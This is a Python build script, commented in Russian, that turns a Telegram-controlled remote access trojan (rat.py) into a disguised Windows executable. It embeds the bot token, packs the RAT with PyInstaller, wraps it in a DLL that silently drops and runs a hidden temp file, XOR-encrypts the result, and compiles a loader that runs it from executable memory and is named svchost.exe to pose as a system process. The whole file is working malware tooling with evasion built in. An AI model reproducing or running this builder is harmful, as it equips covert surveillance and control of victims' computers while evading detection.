# build.py - СБОРКА С ПРОГРЕССОМ И ТАЙМЕРОМ
import os
import sys
import subprocess
import random
import zlib
import shutil
import time
import threading

class StealthBuilder:
    def __init__(self, token, admin_id):
        self.token = token
        self.admin_id = admin_id
        self.xor_key = bytes([random.randint(1, 255) for _ in range(16)])
        
    def build_exe_with_pyinstaller(self):
        print("[+] Building EXE with PyInstaller...")
        start = time.time()
        
        cmd = [
            "pyinstaller",
            "--onefile",
            "--windowed",
            "--name", "payload",
            "--target-arch", "x86",
            "--upx-dir", "C:\\ProgramData\\chocolatey\\lib\\upx\\tools",
            "--hidden-import", "telegram",
            "--hidden-import", "telegram.ext",
            "--hidden-import", "PIL",
            "--hidden-import", "PIL.ImageGrab",
            "--hidden-import", "psutil",
            "--hidden-import", "requests",
            "--hidden-import", "sounddevice",
            "--hidden-import", "soundfile",
            "--hidden-import", "cryptography",
            "--hidden-import", "cryptography.fernet",
            "--hidden-import", "tkinter",
            "--hidden-import", "pycaw",
            "--hidden-import", "comtypes",
            "--hidden-import", "cv2",
            "--hidden-import", "numpy",
            "--hidden-import", "GPUtil",
            "--hidden-import", "win10toast",
            "--collect-all", "telegram",
            "rat.py"
        ]
        
        # Показываем анимацию загрузки
        self.show_spinner("PyInstaller building", start)
        
        result = subprocess.run(cmd, capture_output=True)
        elapsed = int(time.time() - start)
        print(f"\r[+] PyInstaller completed in {elapsed}s    ")
            
        if result.returncode != 0:
            print(f"[-] PyInstaller error: {result.stderr.decode()}")
            return None
            
        exe_path = "dist/payload.exe"
        if not os.path.exists(exe_path):
            for f in os.listdir("dist"):
                if f.endswith(".exe"):
                    exe_path = os.path.join("dist", f)
                    break
        
        if not os.path.exists(exe_path):
            print("[-] EXE not found!")
            return None
            
        shutil.copy(exe_path, "payload.exe")
        size_mb = os.path.getsize('payload.exe') / (1024*1024)
        print(f"[+] EXE ready! Size: {size_mb:.1f} MB")
        return "payload.exe"
    
    def show_spinner(self, task, start_time):
        """Показывает анимацию загрузки с таймером"""
        chars = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
        import time
        import threading
        import sys
        
        stop_spinner = False
        
        def spin():
            i = 0
            while not stop_spinner:
                elapsed = int(time.time() - start_time)
                sys.stdout.write(f'\r[{chars[i % len(chars)]}] {task}... {elapsed}s')
                sys.stdout.flush()
                time.sleep(0.1)
                i += 1
        
        spinner_thread = threading.Thread(target=spin)
        spinner_thread.start()
        return spinner_thread, lambda: setattr(spinner_thread, 'stop_spinner', True)
    
    def run_with_progress(self, cmd, task_name):
        """Запускает команду с отображением прогресса"""
        print(f"[+] {task_name}...")
        start = time.time()
        
        # Запускаем процесс
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        
        # Читаем вывод построчно и показываем
        last_output = ""
        while True:
            line = process.stdout.readline()
            if not line:
                break
            if line.strip():
                print(f"    {line.strip()}")
                last_output = line.strip()
            # Показываем время
            elapsed = int(time.time() - start)
            print(f"\r[{elapsed}s] Running...", end="")
        
        process.wait()
        elapsed = int(time.time() - start)
        print(f"\r[+] {task_name} completed in {elapsed}s    ")
        
        return process.returncode
    
    def exe_to_dll(self, exe_path):
        """Конвертирует EXE в DLL с прогрессом"""
        print("[+] Converting EXE to DLL...")
        start = time.time()
        
        with open(exe_path, 'rb') as f:
            exe_data = f.read()
        
        with open('payload.bin', 'wb') as f:
            f.write(exe_data)
        
        # Создаем C обертку
        dll_code = '''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

extern unsigned char _binary_payload_bin_start[];
extern unsigned char _binary_payload_bin_end[];

static void RunEXE() {
    char temp_path[MAX_PATH];
    char exe_path[MAX_PATH];
    DWORD written;
    HANDLE hFile;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    
    size_t exe_size = _binary_payload_bin_end - _binary_payload_bin_start;
    
    GetTempPathA(MAX_PATH, temp_path);
    sprintf(exe_path, "%s\\\\tmp_%x.exe", temp_path, GetTickCount());
    
    hFile = CreateFileA(exe_path, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    
    WriteFile(hFile, _binary_payload_bin_start, exe_size, &written, NULL);
    CloseHandle(hFile);
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    CreateProcessA(exe_path, NULL, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    Sleep(3000);
    DeleteFileA(exe_path);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunEXE, NULL, 0, NULL);
    }
    return TRUE;
}
'''
        with open('payload_dll.c', 'w') as f:
            f.write(dll_code)
        
        print(f"[+] Creating object file...")
        cmd = ['objcopy', '-I', 'binary', '-O', 'pe-i386', 'payload.bin', 'payload_obj.o']
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            cmd = ['mingw32-objcopy', '-I', 'binary', '-O', 'pe-i386', 'payload.bin', 'payload_obj.o']
            result = subprocess.run(cmd, capture_output=True)
            if result.returncode != 0:
                print("[-] objcopy failed!")
                return None
        
        print(f"[+] Compiling DLL...")
        cmd = [
            'gcc', '-shared', '-o', 'payload.dll',
            'payload_dll.c', 'payload_obj.o',
            '-static', '-s', '-O2',
            '-Wl,--subsystem,windows',
            '-luser32', '-lkernel32'
        ]
        
        # Показываем прогресс компиляции
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        start_time = time.time()
        
        while True:
            line = process.stdout.readline()
            if not line:
                break
            if line.strip():
                elapsed = int(time.time() - start_time)
                print(f"    [{elapsed}s] {line.strip()}")
        
        process.wait()
        
        if process.returncode != 0:
            print("[-] DLL compilation failed!")
            return None
            
        elapsed = int(time.time() - start_time)
        size_mb = os.path.getsize('payload.dll') / (1024*1024)
        print(f"[+] DLL ready! Size: {size_mb:.1f} MB (in {elapsed}s)")
        return "payload.dll"
    
    def encrypt_dll_and_build_loader(self, dll_path):
        """Шифрует DLL с прогрессом"""
        print("[+] Encrypting DLL...")
        start = time.time()
        
        with open(dll_path, 'rb') as f:
            dll_data = f.read()
        
        print(f"    [1/3] Compressing {len(dll_data)/(1024*1024):.1f} MB...")
        compressed = zlib.compress(dll_data, level=9)
        print(f"    [2/3] Compressed to {len(compressed)/(1024*1024):.1f} MB")
        
        print(f"    [3/3] XOR encrypting...")
        encrypted = bytearray(compressed)
        for i in range(len(encrypted)):
            encrypted[i] ^= self.xor_key[i % len(self.xor_key)]
            if i % (1024*1024) == 0:
                print(f"\r    [3/3] Encrypting... {i*100//len(encrypted)}%", end="")
        print(f"\r    [3/3] Encrypted! {len(encrypted)/(1024*1024):.1f} MB    ")
        
        with open('encrypted.bin', 'wb') as f:
            f.write(encrypted)
        with open('key.bin', 'wb') as f:
            f.write(self.xor_key)
        
        elapsed = int(time.time() - start)
        print(f"[+] Encrypted! Size: {len(encrypted)/(1024*1024):.1f} MB (in {elapsed}s)")
        
        # Создаем загрузчик
        print("[+] Creating loader...")
        
        loader_code = '''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

extern unsigned char _binary_encrypted_bin_start[];
extern unsigned char _binary_encrypted_bin_end[];
extern unsigned char _binary_key_bin_start[];
extern unsigned char _binary_key_bin_end[];

static void xor_decrypt(unsigned char* data, size_t len, 
                        unsigned char* key, size_t key_len) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key[i % key_len];
    }
}

static bool LoadDLLFromMemory(unsigned char* dll_data, size_t dll_size) {
    if (dll_data[0] != 'M' || dll_data[1] != 'Z') return false;
    
    void* dll_memory = VirtualAlloc(NULL, dll_size, 
                                    MEM_COMMIT | MEM_RESERVE, 
                                    PAGE_EXECUTE_READWRITE);
    if (!dll_memory) return false;
    
    memcpy(dll_memory, dll_data, dll_size);
    
    unsigned char* bytes = (unsigned char*)dll_memory;
    unsigned int e_lfanew = *(unsigned int*)&bytes[0x3C];
    unsigned int entry_point_rva = *(unsigned int*)&bytes[e_lfanew + 0x28];
    
    typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
    DllMain_t dll_main = (DllMain_t)((unsigned char*)dll_memory + entry_point_rva);
    
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dll_main, 
                                  dll_memory, 0, NULL);
    if (hThread) {
        CloseHandle(hThread);
        return true;
    }
    
    return dll_main((HINSTANCE)dll_memory, DLL_PROCESS_ATTACH, NULL) == TRUE;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\\\RatMutex_7F3A8B2C");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
    
    size_t dll_len = _binary_encrypted_bin_end - _binary_encrypted_bin_start;
    size_t key_len = _binary_key_bin_end - _binary_key_bin_start;
    
    unsigned char* decrypted = (unsigned char*)malloc(dll_len);
    if (!decrypted) return 1;
    
    memcpy(decrypted, _binary_encrypted_bin_start, dll_len);
    xor_decrypt(decrypted, dll_len, _binary_key_bin_start, key_len);
    
    bool success = LoadDLLFromMemory(decrypted, dll_len);
    
    if (!success) {
        char temp_path[MAX_PATH];
        char dll_path[MAX_PATH];
        GetTempPathA(MAX_PATH, temp_path);
        sprintf(dll_path, "%s\\\\tmp_%x.dll", temp_path, GetTickCount());
        
        HANDLE hFile = CreateFileA(dll_path, GENERIC_WRITE, 0, NULL,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hFile, decrypted, dll_len, &written, NULL);
            CloseHandle(hFile);
            LoadLibraryA(dll_path);
            Sleep(3000);
            DeleteFileA(dll_path);
        }
    }
    
    free(decrypted);
    
    while (1) Sleep(10000);
    return 0;
}
'''
        with open('loader_final.cpp', 'w') as f:
            f.write(loader_code)
        
        print("[+] Loader ready!")
        return 'loader_final.cpp'
    
    def compile_loader(self, loader_path):
        """Компилирует финальный EXE с прогрессом"""
        print("[+] Compiling final EXE...")
        print("[!] This takes 3-5 minutes, please wait...")
        start = time.time()
        
        # Конвертируем бинарники в объектные
        for bin_file, obj_file in [('encrypted.bin', 'encrypted.o'), ('key.bin', 'key.o')]:
            cmd = ['objcopy', '-I', 'binary', '-O', 'pe-i386', bin_file, obj_file]
            result = subprocess.run(cmd, capture_output=True)
            if result.returncode != 0:
                cmd = ['mingw32-objcopy', '-I', 'binary', '-O', 'pe-i386', bin_file, obj_file]
                result = subprocess.run(cmd, capture_output=True)
                if result.returncode != 0:
                    print(f"[-] objcopy error for {bin_file}")
                    return None
        
        cmd = [
            'g++',
            '-o', 'svchost.exe',
            loader_path,
            'encrypted.o',
            'key.o',
            '-static',
            '-s',
            '-O1',
            '-Wl,--subsystem,windows',
            '-luser32', '-lkernel32'
        ]
        
        # Показываем прогресс с анимацией
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
        # Анимация ожидания
        chars = ['|', '/', '-', '\\']
        i = 0
        last_output = ""
        
        while True:
            line = process.stdout.readline()
            if not line:
                break
            if line.strip():
                print(f"    {line.strip()}")
                last_output = line.strip()
            
            # Показываем анимацию
            elapsed = int(time.time() - start)
            minutes = elapsed // 60
            seconds = elapsed % 60
            print(f"\r[{chars[i % len(chars)]}] Compiling... {minutes}m {seconds}s", end="")
            i += 1
            time.sleep(0.1)
        
        process.wait()
        elapsed = int(time.time() - start)
        minutes = elapsed // 60
        seconds = elapsed % 60
        print(f"\r[+] Compilation completed in {minutes}m {seconds}s    ")
        
        if process.returncode != 0:
            print("[-] Compilation failed!")
            return None
        
        size_kb = os.path.getsize('svchost.exe') / 1024
        print(f"[+] FINAL EXE ready! Size: {size_kb:.1f} KB")
        return 'svchost.exe'
    
    def build(self):
        print("=" * 60)
        print("[+] STARTING STEALTH RAT BUILD")
        print("=" * 60)
        print()
        total_start = time.time()
        
        print("[+] Updating rat.py...")
        with open('rat.py', 'r', encoding='utf-8') as f:
            content = f.read()
        content = content.replace('{{TOKEN}}', self.token)
        content = content.replace('{{ADMIN_ID}}', str(self.admin_id))
        with open('rat.py', 'w', encoding='utf-8') as f:
            f.write(content)
        print("[+] rat.py updated!")
        print()
        
        exe = self.build_exe_with_pyinstaller()
        if not exe:
            return False
        
        print()
        dll = self.exe_to_dll(exe)
        if not dll:
            return False
        
        print()
        loader = self.encrypt_dll_and_build_loader(dll)
        if not loader:
            return False
        
        print()
        final_exe = self.compile_loader(loader)
        
        if final_exe:
            total_elapsed = int(time.time() - total_start)
            minutes = total_elapsed // 60
            seconds = total_elapsed % 60
            print()
            print("=" * 60)
            print("[+] BUILD COMPLETED SUCCESSFULLY!")
            print(f"[+] Total time: {minutes}m {seconds}s")
            print(f"[+] FINAL EXE: {final_exe} ({os.path.getsize(final_exe) / 1024:.1f} KB)")
            print(f"[+] Original EXE: {exe} ({os.path.getsize(exe) / (1024*1024):.1f} MB)")
            print(f"[+] DLL: {dll} ({os.path.getsize(dll) / (1024*1024):.1f} MB)")
            print(f"[+] Key: {self.xor_key.hex()}")
            print("=" * 60)
            
            with open('key.txt', 'w') as f:
                f.write(self.xor_key.hex())
            
            return True
        
        return False

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python build.py TOKEN ADMIN_ID")
        sys.exit(1)
    
    token = sys.argv[1]
    admin_id = sys.argv[2]
    
    builder = StealthBuilder(token, admin_id)
    builder.build()
